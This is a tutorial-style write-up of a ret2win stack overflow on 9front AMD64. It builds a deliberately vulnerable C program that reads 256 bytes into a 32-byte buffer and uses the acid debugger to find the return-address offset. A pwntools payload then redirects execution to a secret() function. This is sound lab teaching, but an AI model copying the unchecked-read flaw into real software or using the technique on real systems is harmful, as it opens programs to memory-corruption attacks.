9pwn/Ret2Win: simple ret2win in 9front

NOTE: this guide is for AMD64

I'm gonna assume that you know what a ret2win is: poisoning the return address to change the program's execution. In this writeup I will explain how to write and compile a simple C program and how to use 9front's debugger "acid" to get what we want.

Writing the vulnerable program 

#include <u.h>
#include <libc.h>

void secret(void)
{
    print("you win\n");
}

void vulnerable(void)
{
    char buf[32];
    read(0, buf, 256);
}

void main(void)
{
    vulnerable();
    print("nothing happened\n");
}

So we are using u.h and libc.h instead of stdio.h like we normally would...and we are using print() instead of printf() because 9front's C compiler and C library are a different from musl/glibc. print() is also different than printf() but honestly I did not bother looking up the differences (as of right now).

Compiling (and linking) the vulnerable program

The compiler we will use is 6c, which compiles for AMD64 architecture. For i386 we have 8c, for ARM32 there is 5c, for MIPS little endian we have 0c etc.

Similarly, the linker we will use is 6l.

The following creates a file bof.6:

6c bof.c

To link bof.6 (where ./bof is the output file):

6l -o bof bof.6

Now you hopefully have a working program that you can run:

cirno# 6c bof.c
cirno# 6l -o bof bof.6
cirno# ./bof
faaaaah
nothing happened
cirno#

Using acid to debug

Not a great debugger, especially if you are used to gdb but it works. Will get this job done, but first:

man acid

Just have a look at it so you know what you're getting into. Then fire up acid:

acid ./bof

You should see something like this:

Finding the location of return address

9front passes arguments on the stack, and 9front does not follow the System V ABI so no arguments in registers. So, in the vulnerable() function: 
SUBQ	$0x48,SP // allocate stack frame
XORL	BP,BP // zero out the base pointer, idk why probably to set the file descriptor = 0 somehow?
LEAQ	buf+0x28(SP),DI // load address of buffer (SP+0x28) in to DI
MOVQ	DI,0x8(SP) // second argument, put *buf at SP+0x8
MOVL	$0x100,DI // load 256 bytes into DI
MOVL	DI,0x10(SP) // 3rd argument, put 0x100 or 256 at SP+0x10
CALL	read(SB)
ADDQ	$0x48,SP
RET

So since we know that our payload will end up at SP+0x28, let's dump that memory area, after you have sent a few As in the input (which will show up as 0x414141...)

dump(*SP+0x28, 20, "X")

Look at the memory output, count the 0x41s you sent (in this example, I sent 10) to see if our math is correct. Also look at all the values.

From my observation it seems like 0xfefefefe is the uninitialized memory. But can you spot something else? Okay here we go:

So in the example I compiled, 0x00200067 is in main()

Good game babes, now we just do some math

>>> 0x00007fffffffeec8 - 0x00007fffffffeea8
32

Now it's all easy peasy, we know the address of our secret(): 0x200028, and we know the offset of the return address. Since there is no canary, PIE or ASLR, there is no one that can stop us.

Writing an exploit for the pwn

I am a lazy human, so I just used pwntools. The program below creates 32 As and then appends return address of secret()

from pwn import *
payload = b'A' * 32 + p64(0x200028)
with open('input.bin', 'wb') as payload_file:
    payload_file.write(payload)

Make sure the return address is 64 bit and little endian.

Then I sent it over using an http server because I am lazy to configure file sharing between 9front and Linux.

cirno# cat input.bin  | ./bof
you win
bof 835: suicide: sys: trap: general protection violation pc=0x20003a
cirno#
